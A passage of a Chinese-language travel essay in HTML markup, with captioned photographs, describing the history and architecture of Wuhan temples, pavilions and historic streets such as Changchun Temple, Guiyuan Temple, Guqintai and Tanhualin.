data-private-watermark-src=\"v2-84b43c24183a44d2d87031bcd35dc51d\"></p>\n<p><b>小结：</b>以上图片拍摄于十年前，那时东湖绿道还没有修筑，其他数个景区还没有系统规模。近三年东湖环境建设美丽而宏大，例如近几年新开辟东湖绿道我还没有来得及去（有天开车过去，天色已晚，在绿道起始端止步不前，返回了），朋友圈圈友发图风景美不胜收……</p>\n<h3>二、三镇古寺院——古建筑历史文化</h3>\n<h3>道教福地——长春观</h3>\n<p>长春观坐落在武昌蛇山中段，山门洞开，殿阁重重，乌瓦红墙，飞檐翘角，从山脚直到山顶，逐级升上去，如一幅巨大的工笔界画，笔墨精细、青绿彩绘的古代山水殿阁图，从山上直垂到山下……</p>\n<p>长春观给予游人最大的观赏价值正在于此……</p>\n<p><img src=\"https://pic2.zhimg.com/v2-b8752f425978b23b05613ce8b454455d_720w.jpg?rss\" data-rawwidth=\"2487\" data-rawheight=\"1615\" data-size=\"normal\" data-caption=\"长春观原来在武昌古城门外，1926年拆毁武昌古城墙，半世纪后位于城中心。建筑不会移动，城圈往外扩了又扩——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-b8752f425978b23b05613ce8b454455d\" data-watermark-src=\"v2-f520b2f8ea7eb5a1cd1424945cefeeb3\" data-private-watermark-src=\"v2-0d0cd307d68280a19a4897a2a0f801fa\"></p>\n<p>最早的传说，老子从鲁地来到江南，在今天的蛇山这个地方设坛传道。宋代理学家朱熹从江西游历至湖北，《鄂州社稷坛记》 ：“（鄂州：今武昌）城东黄鹄山，废营地一区。东西十丈，南北倍差，按政和五礼画为四坛”。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-cad19e2d6356afab639952af850be990_720w.jpg?rss\" data-rawwidth=\"3072\" data-rawheight=\"2304\" data-size=\"normal\" data-caption=\"长春观曾经被毁，但从图上可见，这座建筑是“修复”而非“重建”，地道古建筑——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-cad19e2d6356afab639952af850be990\" data-watermark-src=\"v2-fa95806ebe45903c96cee1df6074f46a\" data-private-watermark-src=\"v2-28d972b0f05834fb0465320511b1ab29\"></p>\n<p>元代道家传人丘处机（金庸的武侠系列“丘道长”成就他今天的知名度）在此结草庐修炼，自称“长春子”，后来他的弟子在此建“长春观”纪念——长春观得名之历史渊源。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-fa364489874b0be500ac60e889a98b8a_720w.jpg?rss\" data-rawwidth=\"2304\" data-rawheight=\"3072\" data-size=\"normal\" data-caption=\"特别喜欢这样古朴苍老的建筑——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-fa364489874b0be500ac60e889a98b8a\" data-watermark-src=\"v2-81a07893bd03996d65c94d5d7a49c14f\" data-private-watermark-src=\"v2-e6947564a8aced0987a79f42af295eeb\"></p>\n<p>清咸丰二年（1852年），太平军攻武昌城，城墙外长春观为攻城指挥部，先攻下汉阳和汉口，后攻下武昌，毁掉武昌大东门外长春观和宝通寺。</p>\n<p>今长春观于清同治三年重新修造，仿明永乐十二年及清康熙二十六年建筑样式，抹去历史断层，接续两千年道教传承，自那以后，武昌城内外，蛇山上下，古风古韵悠然传承今天。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-0e4f0aa094bee5b1499126204d469773_720w.jpg?rss\" data-rawwidth=\"3072\" data-rawheight=\"2304\" data-size=\"normal\" data-caption=\"长春观会仙桥，由此上去往山上走，风景更幽深——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-0e4f0aa094bee5b1499126204d469773\" data-watermark-src=\"v2-f1165175362dc415551a3430852a553c\" data-private-watermark-src=\"v2-400f2c89ba067dd59dad7676b57a4859\"></p>\n<h3>千年古刹——宝通寺</h3>\n<p>长江南岸武昌多山（丘陵平原湖沼相间），蛇山最著名的园林建筑黄鹤楼公园，洪山最著名的园林建筑宝通禅寺，珞珈山最著名的园林建筑武汉大学。</p>\n<p>宝通寺位于洪山南麓，山门朝向车马川流的武珞路，与长春观的建筑方位平行一致。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-307a2616383b70785b76722c7b9d8f27_720w.jpg?rss\" data-rawwidth=\"3072\" data-rawheight=\"2304\" data-size=\"normal\" data-caption=\"层层石阶朝上走是参观宝通寺的顺序，因为寺院建在山南坡——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-307a2616383b70785b76722c7b9d8f27\" data-watermark-src=\"v2-8b886ae4264d301c42647b725c5d7163\" data-private-watermark-src=\"v2-25afe0412c4cf5c7bf95a668bf756ec3\"></p>\n<p>最早，建于南朝刘宋年间（公元420－479年），距今1580年，武汉三镇寺庙历史最为久远的一座。明成化二十一年定名宝通禅寺，之后数次毁于兵火，今天所见规模于光绪年间及同治年间所建。 </p>\n<p>路边进入山门，门前一对相貌威猛的大石头狮子为明代文物（注：进门前一定不要无视啊！）。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-20d4b1fab2f6a704390751a4809486ef_720w.jpg?rss\" data-rawwidth=\"3072\" data-rawheight=\"2304\" data-size=\"normal\" data-caption=\"双重高台基，石阶，石栏，石柱上的莲花柱头，石阶中间的龙雕丹陛石，精美而古老——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-20d4b1fab2f6a704390751a4809486ef\" data-watermark-src=\"v2-817aac2a4ceb35a37d3124251c1a8830\" data-private-watermark-src=\"v2-40049b694a4a2de32e08c1110ad28871\"></p>\n<p>站在拱形山门前，探头朝里望去，只见殿阁层层依山而上，宝塔巍巍背山而立，林木森森，山石峻峭，映衬着金瓦、红墙、彩绘木雕、白石台阶和白石栏杆……刹那回到千年前。</p>\n<p>洪山宝塔，原名临济塔，元代建成，共有七级，取“七级浮屠”之意，先为砖木结构，山间潮湿，日久容易溃烂。1865年，湖广总督署和湖北巡抚决定集资重修。1871年施工，改砖木结构为石结构，建铁护栏，耗铜6500公斤铸造塔顶，1879年竣工。也就是说。今天我们所见洪山金顶宝塔为清末年建筑。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-3090b2b074633a9f91937e93fac50df7_720w.jpg?rss\" data-rawwidth=\"2304\" data-rawheight=\"3072\" data-size=\"normal\" data-caption=\"中国著名佛塔之一洪山宝塔——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-3090b2b074633a9f91937e93fac50df7\" data-watermark-src=\"v2-ec9edeea32040773eaf41044a02c9d72\" data-private-watermark-src=\"v2-28b9c163334130a30dff5530f21633c4\"></p>\n<p>盘旋而上，俯瞰大江南北武汉三镇——登高而小我，登高而小天下，与黄鹤楼登临全然不一样的感觉（指地方不同登临望远的视野也就是关注点也就起了变化。各有各的风景壮美，没有厚此薄彼的意思。不要来扛！）</p>\n<p><img src=\"https://pic3.zhimg.com/v2-48381a1e4967c60c4518804535851a24_720w.jpg?rss\" data-rawwidth=\"3072\" data-rawheight=\"2304\" data-size=\"normal\" data-caption=\"宝通禅寺大殿正门前陛石石刻云中双游龙（古迹）——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-48381a1e4967c60c4518804535851a24\" data-watermark-src=\"v2-6a61ee8a3720349d4c3c56fda79b88cb\" data-private-watermark-src=\"v2-f6b26e065f749d3d9c2f80adc21976f2\"></p>\n<p>寺内泉水涌出，殿侧古木参天，修林茂竹，奇石摩崖，走一步一处古迹，走一步一段故事，历史绵延不绝，传说绵延不绝，山川景象和人融为一体，寺院永不衰老的秘密。</p>\n<h3>皇家寺院——归元寺</h3>\n<p>归元寺建于明末清初，占地70亩，建筑平面2万平方米。现存殿堂28栋，分为五个院落，建筑年代悠久，建筑规模宏大，环境幽雅，殿堂华丽，数百年来，香火旺盛，香客云集，名扬海内外。</p>\n<p>归元寺开山祖师白光、主峰兄弟，出生江浙，来到湖北汉阳兴国寺，开馆行医，感动地方百姓。清顺治十六年，民间信众集资买王氏花园修建归元禅寺供兄弟二人坐堂传经。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-9253aef7df7433209f64d2cdcf680dd2_720w.jpg?rss\" data-rawwidth=\"2688\" data-rawheight=\"1908\" data-size=\"normal\" data-caption=\"归元寺藏经阁——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-9253aef7df7433209f64d2cdcf680dd2\" data-watermark-src=\"v2-00da8ab0cdd1831744c10948f2336bf5\" data-private-watermark-src=\"v2-23c3da58f35bd2d5c1d59b1da7547bf8\"></p>\n<p>归元寺山门上方，蓝地金字直匾，“归元禅寺”四个大字，光绪皇帝敕赐于光绪十三年（1887年）。</p>\n<p>大雄宝殿、藏经阁、罗汉堂……铜质观音像、白玉佛……其中罗汉堂彩绘脱胎漆制作真人大小五百罗汉为国内佛造像珍品。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-ac14cde355b538611a85fb8117b898e0_720w.jpg?rss\" data-rawwidth=\"2856\" data-rawheight=\"2104\" data-size=\"normal\" data-caption=\"归元寺罗汉堂500罗汉——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-ac14cde355b538611a85fb8117b898e0\" data-watermark-src=\"v2-46b1fa3ce8b48d459eef1820e7fab6d6\" data-private-watermark-src=\"v2-89d8f56ad064775a3f4560f31e75eb4e\"></p>\n<p>归元寺五百罗汉由湖北武汉黄陂王氏父子九年时间塑成。</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-f3141ba7015b284868ea0ba11233570e_720w.jpg?rss\" data-rawwidth=\"3039\" data-rawheight=\"1906\" data-size=\"normal\" data-caption=\"前殿和放生池——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-f3141ba7015b284868ea0ba11233570e\" data-watermark-src=\"v2-55ad8ca6552f22a671e73fa2121a2ac4\" data-private-watermark-src=\"v2-0d85fe8c79fe9e2ebb8d8afb878697c0\"></p>\n<p>上世纪末以来，归元寺香火旺盛至极，逢年过节，信男善女汹涌如潮。报载某年初五凌晨，武汉市民四十万人涌入寺内敬香，有关部门不得不出动3000名保安维护秩序。</p>\n<p>三百年六十年历史的一座寺院，俨然武汉“梵林之首”！“亲民”自然是其中最重要的因素。</p>\n<h3>缅印古风——古德寺</h3>\n<p>古德寺原名古德茅蓬，最初建于清光绪三年（1877年），当年建筑风格与汉地文化圈常见佛寺一般无二。民国初年（1914年至1919年）扩建面积将近三万平方米，这其中一个非常重要的变化是，改中华汉地佛教圈传统中式佛寺建筑风格为缅印佛教文化圈异域建筑风格——和云南等地小乘佛教寺院建筑风格不同，和西藏青海内蒙河北承德等藏传佛教寺院建筑风格更不同。</p>\n<p>专家研究后称为：缅印佛寺建筑风。据说，类似建筑风格的佛寺国内仅此一座，东南亚地区也只有两座（此论可商榷）。 </p>\n<p><img src=\"https://pic1.zhimg.com/v2-3cfccb2819cb8668b0e244c0d8fe28e2_720w.jpg?rss\" data-rawwidth=\"3072\" data-rawheight=\"2304\" data-size=\"normal\" data-caption=\"和中华内地佛教圈寺院建筑风格完全不一样的佛寺建筑在中国中心城市武汉汉口——摄影胡西雷\" data-watermark=\"watermark\" data-original-src=\"v2-3cfccb2819cb8668b0e244c0d8fe28e2\" data-watermark-src=\"v2-acd4476a53b7c1cf9d8c85cdefa83fad\" data-private-watermark-src=\"v2-261cc503666873f252401b5ad49bd80c\"></p>\n<p>所谓的“两座”，另一座指的是缅甸莆甘时代阿难陀佛寺。</p>\n<p>阿难陀寺网上也称阿南达寺（音译），建于公元11世纪蒲甘王朝时期因为模仿印度石窟佛寺建筑风格，建筑学上也称缅印佛寺建筑风格也称东方风格，源头古印度。</p>\n<p> 有一点是没有疑问的：无论古德寺和阿难陀寺相似度的多少，古德寺的建筑风格在中国内陆也是一枝独秀一朵奇葩，打破千年汉文化圈佛寺建筑刻板固定模式，直接去南亚佛教古国寻求设计灵感。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-33bf2c59ab05d5d5b5074afc904c78a9_720w.jpg?rss\" data-rawwidth=\"3072\" data-rawheight=\"2304\" data-size=\"normal\" data-caption=\"古德寺大殿四周透空围廊——摄影胡西雷\" data-watermark=\"watermark\" data-original-src=\"v2-33bf2c59ab05d5d5b5074afc904c78a9\" data-watermark-src=\"v2-92f4f3504d638893d6a039e7fe185cd3\" data-private-watermark-src=\"v2-c8fbf35a086d740ffef3685446312380\"></p>\n<p>古德寺重建于20世纪初，建成于20世纪三十年代，除了借鉴印缅石窟佛寺建筑格局外，同时借鉴欧洲中世纪教堂建筑精华，哥特风、罗马风、希腊风、伊斯兰风，当然最主要的还是印度风和缅甸风（即缅印风）。</p>\n<p>1995年，武汉市政府拨款300万元重修古德寺。1996年，古德寺重兴宗教活动。</p>\n<p>1954年10月，印度总理贾瓦哈拉尔·尼赫鲁访华从北京来武汉，女儿英迪拉.甘地（1966当选为印度总理）同行，父女二人专程来汉口参观古德寺——这件事我父亲特别清楚，当年他在湖北省新闻传媒界任比较重要的职务。</p>\n<p><b>小结</b>：以上几座古建筑，感兴趣的朋友还是可以游一下的，譬如说我们游杭州西湖不会错过灵隐寺；那么我们来武汉为什么不花点时间游几处历史悠久、建筑精美、文化丰富、自然环境幽雅的中华传统木架构古建筑群呢？这样的建筑物历经沧桑保存下来，每一块砖石、每一根梁木都值得我们百倍珍惜。</p>\n<h3>天地之间黄鹤楼</h3>\n<p>游武汉黄鹤楼肯定是首推荐——古迹名胜特别是中国传统木架构古建筑，想要从古保存到今天很难很难，千百年来如果依然存在的话，往往毁了建建了毁反复许多次，黄鹤楼也一样。</p>\n<p>古迹名胜到此一游，古董是价值之一不是全部，历史文化抚今追昔也是游览一大乐趣。今天新建黄鹤楼并不仅仅只是一座楼阁，而是一座规模宏大面积阔大园林山林建筑群风景区，绵延数里分布在整座蛇山山脊包括山坡……</p>\n<p><img src=\"https://pic4.zhimg.com/v2-b4f8e9859ba5aa8ffd68bf308dcfd9a5_720w.jpg?rss\" data-rawwidth=\"2592\" data-rawheight=\"1944\" data-size=\"normal\" data-caption=\"黄鹤楼面朝长江，面朝西方，面朝汉江入长江口，这是历代游人登楼观风景送别赋诗写文的那一个方向——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-b4f8e9859ba5aa8ffd68bf308dcfd9a5\" data-watermark-src=\"v2-5b5047dd551eca7526f312fb7c0b4222\" data-private-watermark-src=\"v2-4a9774d25d4697e439925c275b64681b\"></p>\n<p>下面介绍主要是黄鹤楼建设历史始末，也是武昌城建城历史始末，感兴趣可以点开读一下。如果只需要一个百字内景点简介的就不必点开了。话说到前头！</p>\n<a data-draft-node=\"block\" data-draft-type=\"link-card\" href=\"https://www.zhihu.com/question/463692637/answer/2066224265\" data-image=\"https://pic3.zhimg.com/v2-fb90c0ebf02477e2ab5db70132f06d7e_200x0.jpg\" data-image-width=\"2736\" data-image-height=\"3648\" class=\"internal\">武汉黄鹤楼既然是新建的，游览价值是什么？</a><h3>高山流水古琴台</h3>\n<p><img src=\"https://pic2.zhimg.com/v2-c0e2f362cc721e313b6797ce95a624fe_720w.jpg?rss\" data-rawwidth=\"2048\" data-rawheight=\"1536\" data-size=\"normal\" data-caption=\"汉阳古琴台公园濒临通衢大道交通非常方便——摄影胡西雷\" data-watermark=\"watermark\" data-original-src=\"v2-c0e2f362cc721e313b6797ce95a624fe\" data-watermark-src=\"v2-96ff48e9f70c6f9b19f4656948bc6471\" data-private-watermark-src=\"v2-ea0278977e3bd1075cee74ccaa909107\"></p>\n<p>复制粘贴一段我的散文：</p>\n<p>……汉阳，自古以来舟车往返、商贾云集，自古以来烽烟连绵、争战频繁。古琴台近临通衢大道，所以每每遭遇劫难，由是屡建屡毁、屡毁屡建。1956年，政府拨款全面修复，才有了今天的琴台公园。</p>\n<p>古琴台建筑群，虽然占地不大，但是建筑格局十分精致。庭院、园林、茶室、殿堂、回廊，一步一景、层叠重复，宛转优雅如楚辞。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-8d174849054a10642582a47d128c63f6_720w.jpg?rss\" data-rawwidth=\"2048\" data-rawheight=\"1536\" data-size=\"normal\" data-caption=\"黄樱子在琴台公园进门甬道——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-8d174849054a10642582a47d128c63f6\" data-watermark-src=\"v2-f514dd3112d33b22320e7b8656df197f\" data-private-watermark-src=\"v2-5cb03fe5409afd039502c967df20b79d\"></p>\n<p>庭院深深，林木森森，砖石甬道湿润润洁净如洗……阁子翘檐在如洗碧天下高高地朝两端飞起，琉璃瓦在金阳里变幻着或蓝或绿的光泽。阁前一棵百年老松，针叶团团盘盘，巨大的树冠四方伸展，绿荫翳了整整一个园子。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-4895e46dba0c4baab759b6548b680bb4_720w.jpg?rss\" data-rawwidth=\"3000\" data-rawheight=\"2000\" data-size=\"normal\" data-caption=\"古琴台，台基和碑是真正古迹——摄影胡西雷\" data-watermark=\"watermark\" data-original-src=\"v2-4895e46dba0c4baab759b6548b680bb4\" data-watermark-src=\"v2-3bd95d4d274092aed4a62d3ba3f15277\" data-private-watermark-src=\"v2-e5254f36aae35bf2884423535f9a57a5\"></p>\n<p>汉白玉雕筑的古琴台是清代的遗迹，四周栏板上雕凿出精美灵秀的人物故事，台中立碑刻字，摘录历史典籍有关伯牙和钟子期的故事。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-919ab367ce660f34722f605df364a188_720w.jpg?rss\" data-rawwidth=\"2048\" data-rawheight=\"1536\" data-size=\"normal\" data-caption=\"图上石雕石刻都是真正古迹——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-919ab367ce660f34722f605df364a188\" data-watermark-src=\"v2-09f8413a0919532dc3deb487077c2051\" data-private-watermark-src=\"v2-5adb04ee91fbc3c314a6c2e0ede5cc0f\"></p>\n<p>1977年8月22日，《高山流水》的曲子被刻录入一张镀金光盘，由美国“航天者”号太空船携带升空，在太空反复播放，向广阔无垠的宇宙传播地球文明的信息<b>（胡榴明散文《古琴台》）。</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-0e9cea5df140561ba97625c74abc1377_720w.jpg?rss\" data-rawwidth=\"3000\" data-rawheight=\"2000\" data-size=\"normal\" data-caption=\"古琴台公园一景——摄影胡西雷\" data-watermark=\"watermark\" data-original-src=\"v2-0e9cea5df140561ba97625c74abc1377\" data-watermark-src=\"v2-70348edf1ff2b353b2aad136435a6f94\" data-private-watermark-src=\"v2-c33f8bf33978fc38d6356ef5c3bcaa34\"></p>\n<p>——古琴台的记载最早见于南北朝，北宋时建在汉阳蔡甸，相传伯牙和钟子期在那一段汉江边相遇，当地还有子期村和子期墓等传说中的遗址遗迹。两千年前的龟山（大别山）脚下江湖浩汤不方便泊船，史载“江夏汉江口”所指范围比今天宽广得多。明代，古琴台从蔡甸移往汉阳城郊，借助古城的繁华为千年古迹生辉，后来湮没一段时间。清湖广总督毕沅（字秋帆）于乾隆年间在汉阳月湖畔主持重建，自此古琴台归属汉阳月湖。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-1d72002c5d9c3d332d1d7f802011603a_720w.jpg?rss\" data-rawwidth=\"2560\" data-rawheight=\"1440\" data-size=\"normal\" data-caption=\"汉阳月湖位于古琴台公园和琴台大剧院、琴台音乐厅之间，同属琴台艺术中心——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-1d72002c5d9c3d332d1d7f802011603a\" data-watermark-src=\"v2-4a23b582babb40e3e5a3b8f0aab2bc0b\" data-private-watermark-src=\"v2-575035ca20ed25d8020170420be98f6a\"></p>\n<p>现在古琴台游览就不仅仅是上述的一个小公园了，见下文：</p>\n<p>2007年11月8日，与古琴台一湖相隔的琴台文化艺术中心正式揭幕开园。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-dcd7feba797cd60eea0275403fddcb80_720w.jpg?rss\" data-rawwidth=\"2560\" data-rawheight=\"1440\" data-size=\"normal\" data-caption=\"琴台大剧院——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-dcd7feba797cd60eea0275403fddcb80\" data-watermark-src=\"v2-9aa434c6cd13a14535513281863b3bc1\" data-private-watermark-src=\"v2-805367ccef3e1b2695351993a45db92b\"></p>\n<p>因古琴台而得名的琴台文化艺术中心，是武汉市最大的文化主题公园，总体面积2.15平方公里，建筑面积50万平方米，依汉水，朝龟山，滨月湖，一项规模极其宏大的建筑群，包括月湖北岸的琴台大剧院和琴台音乐厅；月湖南岸的凤凰广场、万人露天剧院、月影舞台；月湖东面的知音岛和唱歌雕塑；东南侧的音乐森林及西南面的莲花湖湿地……</p>\n<p><img src=\"https://pic4.zhimg.com/v2-f4958402b3389e15188041d84aaccc02_720w.jpg?rss\" data-rawwidth=\"2560\" data-rawheight=\"1440\" data-size=\"normal\" data-caption=\"琴台音乐厅——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-f4958402b3389e15188041d84aaccc02\" data-watermark-src=\"v2-983f380444a46f7551648df0a7e6de28\" data-private-watermark-src=\"v2-26ecefed49fa86a0c2fae37fc2dd93e5\"></p>\n<p> 夜幕降临，月亮升起，湖水闪着淡淡的光亮，湖的另一边是古琴台。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-6e0c785e338f1c0e39a6438037be6265_720w.jpg?rss\" data-rawwidth=\"2532\" data-rawheight=\"1424\" data-size=\"normal\" data-caption=\"初秋月湖刚刚凋谢的荷花和肥大的荷叶。荷花是月湖一整个夏天的风景——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-6e0c785e338f1c0e39a6438037be6265\" data-watermark-src=\"v2-ddabd00740f3223a73026a723d5d21b3\" data-private-watermark-src=\"v2-d4fdd5b8c677bd42731fcfae305568b5\"></p>\n<p>《汉口竹枝词》记载，月湖琴台当年是南来北往的商旅和武汉三镇的市民最喜爱的游览地，连夏天乘凉都不嫌路远地往这里跑，说这里比城里凉快得多（当时月湖在汉阳城郊）。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-ccba936d2a73d8612e4413f41b3e99df_720w.jpg?rss\" data-rawwidth=\"2532\" data-rawheight=\"1424\" data-size=\"normal\" data-caption=\"琴台音乐厅隔湖对面是古琴台公园，中间有木道石桥相通——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-ccba936d2a73d8612e4413f41b3e99df\" data-watermark-src=\"v2-0200c076cad0d06a31c3bcbdb96a238c\" data-private-watermark-src=\"v2-16700b3bb1429778db0a53f67e83de66\"></p>\n<h3>汉阳晴川阁、铁门关、大禹文化园（风景区之间相互连接）</h3>\n<p>晴川阁建于明朝初年，与黄鹤楼一江之隔。</p>\n<p>往来的游人经常是先游武昌（古名江夏、鄂州等）黄鹤楼，然后由汉阳门（古黄鹤楼脚下武昌古城门西门）船码头乘木船渡江（一直有轮渡），在龟山脚汉阳城外登岸游玩晴川阁，或者反之。</p>\n<p>晴川阁晚建于黄鹤楼一千多年，自建成之后便得四方游人的倾慕，究其原因，依然是崔颢的诗。</p>\n<p>“晴川历历汉阳树，芳草凄凄鹦鹉洲”（《登黄鹤楼》）</p>\n<p>因一句诗而起一座楼，可见文人对于社会的影响力度。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-a5b9a431d4ca537b7a5cfd446b4fe440_720w.jpg?rss\" data-rawwidth=\"2692\" data-rawheight=\"1812\" data-size=\"normal\" data-caption=\"长江江心（过江轮渡上）看晴川阁——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-a5b9a431d4ca537b7a5cfd446b4fe440\" data-watermark-src=\"v2-32d775f8220a40ac0868f55783927703\" data-private-watermark-src=\"v2-3fc6e299095e26a3c6e495e86172a2db\"></p>\n<p>游览晴川阁自然是要等得天气晴好的时候。</p>\n<p>阁楼后面的一方庭院是禹王庙，记念大禹当年疏江导河的功绩——当年（明初）地方官先建禹王庙（意在镇水）“顺带”建晴川阁，没想到后者比前者更出名。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-58a255be1a7052e2558c691b21f7a310_720w.jpg?rss\" data-rawwidth=\"1944\" data-rawheight=\"2592\" data-size=\"normal\" data-caption=\"禹王庙建在龟山脚长江边，图为禹王庙庭院大门——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-58a255be1a7052e2558c691b21f7a310\" data-watermark-src=\"v2-dcd958dd634d587d69a54adcbdb18f34\" data-private-watermark-src=\"v2-cffbbc968d32012c387d34be9f7915e8\"></p>\n<p>清光绪十七年的春末（1891年4月20日），力倡洋务运动而名震中外的湖广总督张之洞迎宾酒宴摆在晴川阁盛情款待俄皇太子尼古拉（末代沙皇尼古拉二世），因为汉口华俄茶叶贸易。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-ae5cacb44d85154fdd9ec01fd41fe1ba_720w.jpg?rss\" data-rawwidth=\"2592\" data-rawheight=\"1944\" data-size=\"normal\" data-caption=\"晴川阁前禹王矶上朝宗亭,传言大禹治水成功于此,取尚书,江汉朝宗于海之意.亭下是毛会建手书山高水长的石刻碑——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-ae5cacb44d85154fdd9ec01fd41fe1ba\" data-watermark-src=\"v2-d2ad69e6a9371f83fa75f6caa4f40766\" data-private-watermark-src=\"v2-fc2e3b9ad0393bf62f2dc52917da74e3\"></p>\n<p>这一天， 张之洞即兴赋诗书赠宾客——“日丽晴川开琦席，花明汉水迓霓旌”。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-cc15e8ebec46da7ac52b4beed92af77a_720w.jpg?rss\" data-rawwidth=\"1944\" data-rawheight=\"2592\" data-size=\"normal\" data-caption=\"晴川阁楼上，山高水长四个字是明末文人（古建筑保护者）毛会建手迹——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-cc15e8ebec46da7ac52b4beed92af77a\" data-watermark-src=\"v2-9faf26bf87d3ee6743febc6959ba7382\" data-private-watermark-src=\"v2-0523281b3aa28bfdade6a497beecd353\"></p>\n<p>晴川阁公园包括铁门关：“吴魏相争，设关于此”。吴主孙权为了阻挡北魏西蜀建城防御建铁门关，唐宋明清这一带成为商贸聚集地，明末年铁门关被毁，民国年间这一段江岸日渐冷落。上世纪末政府拨资修复战乱损坏（阳夏之战被清军炮轰损毁部分）的晴川阁，同期在汉阳洗马长街凌空重建铁门关。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-2bb40f5441e6e491b4308f28a44595a9_720w.jpg?rss\" data-rawwidth=\"2592\" data-rawheight=\"1944\" data-size=\"normal\" data-caption=\"晴川阁旁洗马长街横跨铁门关，可从晴川阁公园里边登城楼——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-2bb40f5441e6e491b4308f28a44595a9\" data-watermark-src=\"v2-b336efbf0c7fff926b83f3d2d19795fc\" data-private-watermark-src=\"v2-9d1c995d4a06399252b0803c41d811bd\"></p>\n<p>走出晴川阁，上洗马长街，左转，走进大禹神话园，也就是汉阳江滩公园。</p>\n<p>先游禹王庙，再游大禹神话园，其实是一条顺理成章的旅游线路。</p>\n<p>远古洪水肆虐，于是有了大禹在此劈山泄洪的神话传说，于是有了禹王庙，于是有了今天的大禹神话园（汉阳江滩公园之一）。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-fcc0fc4aebde9919422f0b2bc7aa6475_720w.jpg?rss\" data-rawwidth=\"2592\" data-rawheight=\"1944\" data-size=\"normal\" data-caption=\"黄樱子在大禹治水大型雕塑前——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-fcc0fc4aebde9919422f0b2bc7aa6475\" data-watermark-src=\"v2-1bfdad8eb1762c7189cb38980ec646e6\" data-private-watermark-src=\"v2-78dd2e2b94a2c69d619e749d59690037\"></p>\n<p>背面龟山电视塔，侧面桥头堡，武汉三镇最美的大型雕塑墙，圆雕和浮雕，赭黄色的石材，雕工精美，气势磅礴。</p>\n<h3>风光人文昙华林</h3>\n<p>武昌昙华林，位于古武昌城东北城门武胜门内螃蟹岬以西一条古巷，历史可上朔到明洪武四年（公元1371年），从古到今兴毁数次，最近一次修复重建工程，2012年开始，至今还没有全部完成。</p>\n<p>2016年武汉大学出版社约稿写《昙华林》，从这一年起每隔不久来昙华林晃荡一次。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-2630b0cdfc6cc32020c07ac020135e32_720w.jpg?rss\" data-rawwidth=\"3648\" data-rawheight=\"2736\" data-size=\"normal\" data-caption=\"昙华林街——摄影胡西雷\" data-watermark=\"watermark\" data-original-src=\"v2-2630b0cdfc6cc32020c07ac020135e32\" data-watermark-src=\"v2-4d3cafe97e51610b309412abd70bd1b3\" data-private-watermark-src=\"v2-284d6e5520d032e5668be61d8693c06d\"></p>\n<p>我去一般两条路线：自驾导航武昌昙华林街，小东门中山路路边湖北美术学院旁边一条小街就是。另一条路线搭乘武汉地铁2号线螃蟹岬站，A2出口，站口商圈吃喝玩乐，然后横向朝昙华林小街步行300米，右转朝长江方向沿小街边走边看，这就是来昙华林的玩法。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-01d61e74b6067fcb2c3cfa810d19d3e0_720w.jpg?rss\" data-rawwidth=\"2976\" data-rawheight=\"3968\" data-size=\"normal\" data-caption=\"地铁2号线螃蟹岬站距离昙华林街300米——摄影冯慧\" data-watermark=\"watermark\" data-original-src=\"v2-01d61e74b6067fcb2c3cfa810d19d3e0\" data-watermark-src=\"v2-cd955b5322d57bf1417a11884a58a9e5\" data-private-watermark-src=\"v2-c39e8e1eb3f9d4c263ed827e68947406\"></p>\n<p>看什么呢？</p>\n<p>虽说是一条古街，但战乱毁掉明清古建筑（中国传统古典建筑），现在人来昙华林主要参观四大教区遗留下来的近现代西式建筑，由建筑了解历史了解文化了解城市建设发展轨迹——现代人称旅游为文化旅游，即此。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-4e604ec232e55a1929dfea023953d016_720w.jpg?rss\" data-rawwidth=\"3648\" 